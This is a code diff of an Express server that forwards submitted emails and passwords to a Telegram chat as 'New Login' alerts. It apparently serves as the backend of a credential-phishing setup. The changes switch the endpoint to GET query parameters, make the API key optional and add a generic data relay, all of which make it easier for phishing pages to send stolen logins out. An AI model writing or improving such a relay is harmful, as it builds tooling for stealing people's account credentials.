@@ -41,24 +41,42 @@ function startKeepAlive() {
   }, 30000); // Ping every 30 seconds
 }
 
-// API endpoint
-app.post("/send", async (req, res) => {
-  const { api_key, bot_token, user_id, email, password } = req.body;
+// API endpoint with query parameters (like your example)
+app.get("/send", async (req, res) => {
+  const { TOKEN, CHAT, data, api_key, email, password } = req.query;
 
-  // Check API key
-  if (api_key !== API_KEY) {
+  // Check API key (if provided)
+  if (api_key && api_key !== API_KEY) {
     return res.status(403).json({ success: false, error: "Invalid API key" });
   }
 
-  // Validate required fields
-  if (!bot_token || !user_id || !email || !password) {
-    return res
-      .status(400)
-      .json({ success: false, error: "Missing required fields" });
+  // Validate required fields (either TOKEN/CHAT/data OR email/password)
+  let bot_token, user_id, message;
+  
+  if (TOKEN && CHAT && data) {
+    // Using the format like your example: TOKEN, CHAT, data
+    bot_token = TOKEN;
+    user_id = CHAT;
+    message = decodeURIComponent(data);
+  } else if (email && password) {
+    // Using the original format with email/password
+    bot_token = req.query.bot_token;
+    user_id = req.query.user_id;
+    
+    if (!bot_token || !user_id) {
+      return res.status(400).json({ 
+        success: false, 
+        error: "Missing required fields: need bot_token and user_id when using email/password" 
+      });
+    }
+    
+    message = `<b>New Login</b>\n📧 Email: ${email}\n🔑 Password: ${password}`;
+  } else {
+    return res.status(400).json({ 
+      success: false, 
+      error: "Missing required fields. Use either: 1) TOKEN, CHAT, data OR 2) api_key, bot_token, user_id, email, password" 
+    });
   }
-
-  // Create message
-  const message = `<b>New Login</b>\n📧 Email: ${email}\n🔑 Password: ${password}`;
 
   // Send to Telegram
   const sent = await sendToTelegram(bot_token, user_id, message);
@@ -86,8 +104,11 @@ app.get("/", (req, res) => {
   res.json({ 
     success: true, 
     message: "Telegram API is running",
-    usage: "Send a POST request to /send with api_key, bot_token, user_id, email, and password",
-    keep_alive: "This server automatically pings itself every 30 seconds to stay alive on Render"
+    usage: [
+      "Method 1: GET /send?TOKEN=bot_token&CHAT=user_id&data=message",
+      "Method 2: GET /send?api_key=key&bot_token=token&user_id=id&email=test@example.com&password=test123"
+    ],
+    demo: "https://your-app-name.onrender.com/send?TOKEN=YOUR_BOT_TOKEN&CHAT=YOUR_CHAT_ID&data=" + encodeURIComponent("Hello World")
   });
 });
 
